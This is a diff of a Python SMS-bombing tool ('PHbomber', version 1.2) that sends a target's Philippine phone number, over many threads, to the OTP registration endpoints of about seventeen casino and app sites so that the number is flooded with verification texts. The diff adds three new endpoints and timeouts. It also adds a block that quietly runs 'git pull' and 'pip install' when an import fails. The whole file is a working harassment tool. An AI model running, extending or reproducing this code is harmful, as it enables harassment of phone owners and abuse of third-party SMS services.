@@ -4,10 +4,17 @@ import sys
 import os
 import base64
 import json
-import random
 import datetime
-from icecream import ic
-from multiprocessing.pool import ThreadPool
+import random
+import string
+try:
+    from requests_toolbelt.multipart.encoder import MultipartEncoder
+    from icecream import ic
+    from multiprocessing.pool import ThreadPool
+except:
+    os.system("git pull")
+    os.system("pip install -r requirements.txt")
+    os.system("python run.py")
 blue = "\033[1;96m"
 white = "\033[1;97m"
 green = "\033[1;92m"
@@ -20,7 +27,7 @@ logo = (""" \033[1;92m____  _   _ _                     _
 | |_) | |_| | '_ \ / _ \| '_ ` _ \| '_ \ / _ \ '__|
 |  __/|  _  | |_) | (_) | | | | | | |_) |  __/ |
 |_|   |_| |_|_.__/ \___/|_| |_| |_|_.__/ \___|_|
- by aknown version 0.8""")
+ by aknown version 1.2""")
 if sys.platform == "linux" or sys.platform == "linux2":
     clr = "clear"
 elif sys.platform == "win32" or sys.platform == "cygwin" or sys.platform == "msys":
@@ -44,7 +51,7 @@ if sys.version_info[0] != 3:
     os.system('clear')
     print(logo)
     print(65 * '\033[1;92m=')
-    print('''\t\tREQUIRED PYTHON 3.x\n\t\tinstall and try: python3 fb.py\n''')
+    print('''\t\tREQUIRED PYTHON 3.x\n\t\tinstall and try: python3 run.py\n''')
     print(65 * '\033[1;92m═')
     sys.exit()
 
@@ -146,20 +153,20 @@ def otp(number):
               'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36 Edg/117.0.2045.60', 'sec-ch-ua-platform': '"Windows"', 'Accept': '*/*', 'Origin': 'https://www.cocacolahightech.com', 'Sec-Fetch-Site': 'same-site', 'Sec-Fetch-Mode': 'cors', 'Sec-Fetch-Dest': 'empty', 'Referer': 'https://www.cocacolahightech.com/', 'Accept-Encoding': 'gzip', 'Accept-Language': 'en-US,en;q=0.9'}
     body = {"mobile": str(number), "code": "", "type": 0}
     try:
-        web = requests.post(url, headers=header, json=body)
+        web = requests.post(url, headers=header, json=body, timeout=8)
         r = json.loads(web.text)
         if debug == True:
-            ic(f"{r} from cocacolahightech")
+            print(f"{r} from cocacolahightech")
         if r["code"] == 200:
             LIMIT += 1
             return True
         else:
             ERROR += 1
             return False
-    except:
+    except Exception as e:
         ERROR += 1
         if debugError == True:
-            ic(f"\033[1;91mError cocacola\033[1;92m")
+            print(f"\033[1;91mError cocacola {e}\033[1;92m")
         return False
 # api1
 
@@ -172,20 +179,21 @@ def otp1(number):
               'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36 Edg/117.0.2045.60', 'Content-Type': 'application/json', 'Accept': '*/*', 'Origin': 'https://skpools.pro', 'Sec-Fetch-Site': 'same-site', 'Sec-Fetch-Mode': 'cors', 'Sec-Fetch-Dest': 'empty', 'Referer': 'https://skpools.pro/', 'Accept-Encoding': 'gzip', 'Accept-Language': 'en-US,en;q=0.9'}
     body = {"phone": str(number), "type": "1"}
     try:
-        web = requests.post(url, headers=header, json=body)
+        web = requests.post(url, headers=header, json=body, timeout=8)
         r = json.loads(web.text)
         if debug == True:
-            ic(f"{r} from skpools")
+            print(f"{r} from skpools")
         if r["code"] == 200:
             LIMIT += 1
+            time.sleep(60)
             return True
         else:
             ERROR += 1
             return False
-    except:
+    except Exception as e:
         ERROR += 1
         if debugError == True:
-            ic(f"\033[1;91mError otp1\033[1;92m")
+            print(f"\033[1;91mError otp1 {e}\033[1;92m")
         return False
 # api2
 
@@ -225,20 +233,20 @@ def otp2(number):
     encrypt_body = bencoder(str(str_body))
     body = {"content": str(encrypt_body)}
     try:
-        web = requests.post(url, headers=header, data=body)
+        web = requests.post(url, headers=header, data=body, timeout=8)
         r = json.loads(web.text)
         if debug == True:
-            ic(f"{r} from ma7hrte")
+            print(f"{r} from ma7hrte")
         if r["code"] == 0:
             LIMIT += 1
             return True
         else:
             ERROR += 1
             return False
-    except:
+    except Exception as e:
         ERROR += 1
         if debugError == True:
-            ic(f"\033[1;91mError otp2\033[1;92m")
+            print(f"\033[1;91mError otp2 {e}\033[1;92m")
         return False
 # api3
 
@@ -252,11 +260,11 @@ def otp3(number):
     body = {"operationName": "loginRegister", "variables": {"input": {"mobile": str(
         number), "appFlavor": "C"}}, "query": "mutation loginRegister($input: LoginRegisterInput!) {\nloginRegister(input: $input)\n}\n"}
     try:
-        web = requests.post(url, headers=header, json=body)
+        web = requests.post(url, headers=header, json=body, timeout=8)
         r = json.loads(web.text)
         time.sleep(5)
         if debug == True:
-            ic(f"{r} from toktok")
+            print(f"{r} from toktok")
         if r["data"]["loginRegister"] == "REGISTER":
             LIMIT += 1
             return True
@@ -264,10 +272,10 @@ def otp3(number):
             ERROR += 1
             return False
 
-    except:
+    except Exception as e:
         ERROR += 1
         if debugError == True:
-            ic(f"\033[1;91mError otp3\033[1;92m")
+            print(f"\033[1;91mError otp3 {e}\033[1;92m")
         return False
 # api4
 
@@ -280,20 +288,20 @@ def otp4(number):
               'Content-Length': '23', 'Host': '8.212.181.240', 'Connection': 'Keep-Alive', 'Accept-Encoding': 'gzip', 'User-Agent': 'okhttp/4.9.0'}
     body = {"phone": str(number)}
     try:
-        web = requests.post(url, headers=header, json=body)
+        web = requests.post(url, headers=header, json=body, timeout=8)
         r = json.loads(web.text)
         if debug == True:
-            ic(f"{r} from 777pub 1")
+            print(f"{r} from 777pub 1")
         if r["msg"] == "success":
             LIMIT += 1
             return True
         else:
             ERROR += 1
             return False
-    except:
+    except Exception as e:
         ERROR += 1
         if debugError == True:
-            ic(f"\033[1;91mError otp4\033[1;92m")
+            print(f"\033[1;91mError otp4 {e}\033[1;92m")
         return False
 # api5
 
@@ -307,20 +315,20 @@ def otp5(number):
     body = {'token': 'MTY3MTY2NTM2NH61idmEdMlptKqwbQ', 'tel': str(
         number), 'type': 0, 'area': '63', 'language': 'en-us'}
     try:
-        web = requests.post(url, headers=header, data=body)
+        web = requests.post(url, headers=header, data=body, timeout=8)
         r = json.loads(web.text)
         if debug == True:
-            ic(f"{r} from 777pub")
+            print(f"{r} from 777pub")
         if r["code"] == 0:
             LIMIT += 1
             return True
         else:
             ERROR += 1
             return False
-    except:
+    except Exception as e:
         ERROR += 1
         if debugError == True:
-            ic(f"\033[1;91mError otp5\033[1;92m")
+            print(f"\033[1;91mError otp5 {e}\033[1;92m")
         return False
 # api6
 
@@ -335,10 +343,10 @@ def otp6(number):
     body = {"mobile": str(number), "event": "register"}
 
     try:
-        web = requests.post(url, headers=header, data=body)
+        web = requests.post(url, headers=header, data=body, timeout=8)
         r = json.loads(web.text)
         if debug == True:
-            ic(f"{r} from vividzoo")
+            print(f"{r} from vividzoo")
         if r['code'] == 1:
             LIMIT += 1
             return True
@@ -348,7 +356,7 @@ def otp6(number):
     except Exception as e:
         ERROR += 1
         if debugError == True:
-            ic(f"\033[1;91mError otp6\033[1;92m {e}")
+            print(f"\033[1;91mError otp6\033[1;92m {e}")
         return False
 # api7
 
@@ -364,20 +372,20 @@ def otp7(number):
     body = {"mobile": str(number), "countryCode": 63}
     web = session.post(url, headers=header, data=body)
     try:
-        web = session.post(url, headers=header, data=body)
+        web = session.post(url, headers=header, data=body, timeout=8)
         r = json.loads(web.text)
         if debug == True:
-            ic(f"{r} from gplayer77")
+            print(f"{r} from gplayer77")
         if r['code'] == 200:
             LIMIT += 1
             return True
         else:
             ERROR += 1
             return False
-    except:
+    except Exception as e:
         ERROR += 1
         if debugError == True:
-            ic(f"\033[1;91mError otp7\033[1;92m")
+            print(f"\033[1;91mError otp7 {e}\033[1;92m")
         return False
 # api8
 
@@ -400,10 +408,10 @@ def otp8(number):
         "key": "$2y$10$q/dRLLwlu7Gyqb8aYs8xgOGKZqzjTBy20EmeuUBUdtCOpyWvGnC4S"
     }
     try:
-        web = session.post(url, headers=header, data=body)
+        web = session.post(url, headers=header, data=body, timeout=8)
         r = json.loads(web.text)
         if debug == True:
-            ic(f"{web.status_code} from taibots")
+            print(f"{web.status_code} from taibots")
         if r['code'] == 0:
             LIMIT += 1
             return True
@@ -413,7 +421,7 @@ def otp8(number):
     except Exception as e:
         ERROR += 1
         if debugError == True:
-            ic(f"\033[1;91mError otp8\033[1;92m")
+            print(f"\033[1;91mError otp8\033[1;92m")
         return False
 # api9
 
@@ -427,44 +435,21 @@ def otp9(number):
               'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36 Edg/108.0.1462.54', 'sec-ch-ua-platform': '"Windows"', 'sec-gpc': '1', 'Origin': 'https://m.ayala-vip.com/', 'Sec-Fetch-Site': 'cross-site', 'Sec-Fetch-Mode': 'cors', 'Sec-Fetch-Dest': 'empty', 'Referer': 'https://m.ayala-vip.com/', 'Accept-Encoding': 'gzip', 'Accept-Language': 'en-US,en;q=0.9'}
     body = {"mobile": str(number), "type": "3"}
     try:
-        web = session.post(url, headers=header, data=body)
+        web = session.post(url, headers=header, data=body, timeout=8)
         if debug == True:
-            ic(f"{web.status_code} from ayala group")
+            print(f"{web.status_code} from ayala group")
         if int(web.status_code) == 200:
             LIMIT += 1
             return True
         else:
             ERROR += 1
             return False
-    except:
+    except Exception as e:
         ERROR += 1
         if debugError == True:
-            ic(f"\033[1;91mError otp9\033[1;92m")
+            print(f"\033[1;91mError otp9 {e}\033[1;92m")
         return False
 # api10
-
-
-def otp10(number):
-    global LIMIT, ERROR
-    number = to9(number=number)
-    session = requests.Session()
-    url = "https://api.yhaphtai.com/home/login/register_code"
-    body = {"phone": str(number), "captcha": ""}
-    try:
-        web = session.post(url, json=body)
-        if debug == True:
-            ic(f"{web.status_code} from yhaphtai")
-        if int(web.status_code) == 200:
-            LIMIT += 1
-            return True
-        else:
-            ERROR += 1
-            return False
-    except:
-        ERROR += 1
-        if debugError == True:
-            ic(f"\033[1;91mError otp10\033[1;92m")
-        return False
 
 
 def otp11(number):
@@ -479,10 +464,10 @@ def otp11(number):
     body = {"mobileNo": str(number)}
 
     try:
-        web = session.post(url, headers=header, json=body)
+        web = session.post(url, headers=header, json=body, timeout=8)
         result = json.loads(web.text)
         if debug == True:
-            ic(f"{web.status_code} from luxeplay")
+            print(f"{web.status_code} from luxeplay")
         if result['success'] == True:
             LIMIT += 1
             try:
@@ -497,10 +482,10 @@ def otp11(number):
         else:
             ERROR += 1
             return False
-    except:
+    except Exception as e:
         ERROR += 1
         if debugError == True:
-            ic(f"\033[1;91mError otp11\033[1;92m")
+            print(f"\033[1;91mError otp11 {e}\033[1;92m")
         return False
 
 
@@ -516,10 +501,10 @@ def otp12(number):
     body = {"countryDialingCode": "63", "mobileNo": str(number)}
 
     try:
-        web = session.post(url, headers=header, json=body)
+        web = session.post(url, headers=header, json=body, timeout=8)
         result = json.loads(web.text)
         if debug == True:
-            ic(f"{web.status_code} from wagi777")
+            print(f"{web.status_code} from wagi777")
         if result['success'] == True:
             LIMIT += 1
             try:
@@ -534,10 +519,10 @@ def otp12(number):
         else:
             ERROR += 1
             return False
-    except:
+    except Exception as e:
         ERROR += 1
         if debugError == True:
-            ic(f"\033[1;91mError otp12\033[1;92m")
+            print(f"\033[1;91mError otp12 {e}\033[1;92m")
         return False
 
 
@@ -549,14 +534,14 @@ def otp13(number):
     session = requests.Session()
     url = "https://www.wqb753.com/wps/verification/sms/register"
     header = {'Host': 'www.wqb753.com', 'Connection': 'keep-alive', 'Content-Length': '51', 'X-Gateway-Version': '3', 'sec-ch-ua': '"Chromium";v="122", "Not(A', 'Language': 'EN', 'sec-ch-ua-mobile': '?0', 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36', 'Content-Type': 'application/json', 'Merchant': 'winhq9f2',
-              'Accept': 'application/json, text/plain, */*', 'Device': 'web', 'sec-ch-ua-platform': '"Windows"', 'Sec-GPC': '1', 'Accept-Language': 'en-US,en;q=0.9', 'Origin': 'https://www.wqb753.com', 'Sec-Fetch-Site': 'same-origin', 'Sec-Fetch-Mode': 'cors', 'Sec-Fetch-Dest': 'empty', 'Referer': 'https://www.wqb753.com/register?r=ire2079', 'Accept-Encoding': 'gzip, deflate, br'}
+              'Accept': 'application/json, text/plain, */*', 'Device': 'web', 'sec-ch-ua-platform': '"Windows"', 'Sec-GPC': '1', 'Accept-Language': 'en-US,en;q=0.9', 'Origin': 'https://www.wqb753.com', 'Sec-Fetch-Site': 'same-origin', 'Sec-Fetch-Mode': 'cors', 'Sec-Fetch-Dest': 'empty', 'Referer': 'https://www.wqb753.com/register?r=ire2079', 'Accept-Encoding': 'gzip'}
     body = {"countryDialingCode": "63", "mobileNo": str(number)}
 
     try:
-        web = session.post(url, headers=header, json=body)
+        web = session.post(url, headers=header, json=body, timeout=8)
         result = json.loads(web.text)
         if debug == True:
-            ic(f"{web.status_code} from wqb753")
+            print(f"{web.status_code} from wqb753")
         if result['success'] == True:
             LIMIT += 1
             try:
@@ -571,10 +556,10 @@ def otp13(number):
         else:
             ERROR += 1
             return False
-    except:
+    except Exception as e:
         ERROR += 1
         if debugError == True:
-            ic(f"\033[1;91mError otp13\033[1;92m")
+            print(f"\033[1;91mError otp13 {e}\033[1;92m")
         return False
 
 
@@ -589,10 +574,10 @@ def otp14(number):
             "username": f"aknownnnn", "type": "register"}
 
     try:
-        web = session.post(url, headers=header, json=body)
+        web = session.post(url, headers=header, json=body, timeout=8)
         result = json.loads(web.text)
         if debug == True:
-            ic(f"{web.status_code} from edi wow")
+            print(f"{web.status_code} from edi wow")
         if result['resCode'] == 200:
             LIMIT += 1
             time.sleep(60)
@@ -600,11 +585,115 @@ def otp14(number):
         else:
             ERROR += 1
             return False
-    except:
+    except Exception as e:
         ERROR += 1
         if debugError == True:
-            ic(f"\033[1;91mError otp14\033[1;92m")
+            print(f"\033[1;91mError otp14 {e}\033[1;92m")
         return False
+
+
+def otp15(number):
+    global LIMIT, ERROR
+    number = to09(number=number)
+    session = requests.Session()
+    url = "https://www.tamabet.tv/wps/verification/sms/register"
+    header = {'Host': 'www.tamabet.tv', 'Connection': 'keep-alive', 'Content-Length': '52', 'X-Gateway-Version': '3', 'sec-ch-ua': '"Chromium";v="122", "Not(A', 'Language': 'EN', 'sec-ch-ua-mobile': '?0', 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36', 'Content-Type': 'application/json', 'Merchant': 'tamabetf2',
+              'Accept': 'application/json, text/plain, */*', 'Device': 'web', 'sec-ch-ua-platform': '"Windows"', 'Sec-GPC': '1', 'Accept-Language': 'en-US,en;q=0.8', 'Origin': 'https://www.tamabet.tv', 'Sec-Fetch-Site': 'same-origin', 'Sec-Fetch-Mode': 'cors', 'Sec-Fetch-Dest': 'empty', 'Referer': 'https://www.tamabet.tv/register?affiliateCode=cmbv16', 'Accept-Encoding': 'gzip'}
+    body = {"countryDialingCode": "63", "mobileNo": str(number)}
+
+    try:
+        web = session.post(url, headers=header, json=body, timeout=8)
+        result = json.loads(web.text)
+        if debug == True:
+            print(f"{web.status_code} from tama bet")
+        if result['success'] == True:
+            LIMIT += 1
+            try:
+                sleep = result['value']['expiredMinutes']*60
+                time.sleep(sleep)
+            except:
+                pass
+            return True
+        else:
+            ERROR += 1
+            return False
+    except Exception as e:
+        ERROR += 1
+        if debugError == True:
+            print(f"\033[1;91mError otp15 {e}\033[1;92m")
+        return False
+
+
+def otp16(number):
+    global LIMIT, ERROR
+    number = to09(number=number)
+    session = requests.Session()
+    url = "https://www.luxebet9.com/wps/verification/sms/register"
+    header = {'Host': 'www.luxebet9.com', 'Connection': 'keep-alive', 'Content-Length': '26', 'X-Gateway-Version': '3', 'sec-ch-ua': '"Chromium";v="122", "Not(A', 'Language': 'EN', 'sec-ch-ua-mobile': '?0', 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36', 'Content-Type': 'application/json', 'Merchant': 'crazywin',
+              'Accept': 'application/json, text/plain, */*', 'Device': 'web', 'sec-ch-ua-platform': '"Windows"', 'Sec-GPC': '1', 'Accept-Language': 'en-US,en;q=0.7', 'Origin': 'https://www.luxebet9.com', 'Sec-Fetch-Site': 'same-origin', 'Sec-Fetch-Mode': 'cors', 'Sec-Fetch-Dest': 'empty', 'Referer': 'https://www.luxebet9.com/register?affiliateCode=vrc49', 'Accept-Encoding': 'gzip'}
+    body = {"mobileNo": str(number)}
+
+    try:
+        web = session.post(url, headers=header, json=body, timeout=8)
+        result = json.loads(web.text)
+        if debug == True:
+            print(f"{web.status_code} from luxebet9")
+        if result['success'] == True:
+            LIMIT += 1
+            try:
+                sleep = result['value']['expiredMinutes']*60
+                time.sleep(sleep)
+            except:
+                pass
+            return True
+        else:
+            ERROR += 1
+            return False
+    except Exception as e:
+        ERROR += 1
+        if debugError == True:
+            print(f"\033[1;91mError otp16 {e}\033[1;92m")
+        return False
+
+
+def otp17(number):
+    global LIMIT, ERROR
+    number = toplus63(number=number)
+    session = requests.Session()
+    {"msg": "Verification code sent successfully",
+        "data": "Verification code sent successfully", "status": 200}
+    url = "https://clientapi.shwgwlkj.com/user/get-phone-code"
+    boundary = '----WebKitFormBoundary' + \
+        ''.join(random.sample(string.ascii_letters + string.digits + string.ascii_uppercase, 16))
+
+    fields = {
+        'code': 'Masaya365',
+        'type': '0',
+        'language': 'en',
+        'phone': str(number)
+    }
+    m = MultipartEncoder(fields=fields, boundary=boundary)
+    headers = {'Host': 'clientapi.shwgwlkj.com', 'Connection': 'keep-alive', 'Content-Length': '438', 'sec-ch-ua': '"Chromium";v="122", "Not(A', 'Accept': 'application/json, text/javascript, */*; q=0.01', 'Content-Type': f'multipart/form-data; boundary={boundary}', 'sec-ch-ua-mobile': '?0', 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36', 'sec-ch-ua-platform': '"Windows"', 'Sec-GPC': '1', 'Accept-Language': 'en-US,en;q=0.9', 'Origin': 'https://masaya656.com', 'Sec-Fetch-Site': 'cross-site', 'Sec-Fetch-Mode': 'cors', 'Sec-Fetch-Dest': 'empty', 'Referer': 'https://masaya656.com/', 'Accept-Encoding': 'gzip'}
+    try:
+        web = session.post(url, headers=headers, data=m.to_string(), timeout=8)
+        result = json.loads(web.text)
+        print(result)
+        if debug:
+            print(f"{web.status_code} from clientapi.shwgwlkj.com")
+        if result['status'] == 200:
+            LIMIT += 1
+            time.sleep(61*5)
+            return True
+        else:
+            ERROR += 1
+            return False
+    except Exception as e:
+        print(e)
+        ERROR += 1
+        if debugError:
+            print(f"\033[1;91mError get_phone_code {e}\033[1;92m")
+        return False
+
 # you can add api and put it in the box to run
 
 # mainporcesore
@@ -649,7 +738,10 @@ def home():
     print("\033[1;92m║ \033[1;94m—> \033[1;92mLIMIT")
     # all process put in the box to put in multiprocess
     function = [otp, otp1, otp2, otp3, otp4,
-                otp5, otp6, otp7, otp8, otp9, otp10, otp11, otp12, otp13, otp14]
+                otp5, otp6, otp7, otp8, otp9,
+                otp11, otp12, otp13, otp14, 
+                otp15, otp16, otp17
+                ]
     # append LIMIT in global variables
     LIMIT1 = pick()
     print("\033[1;92m║ \033[1;94m—> \033[1;92mThreads Sleep default:1")
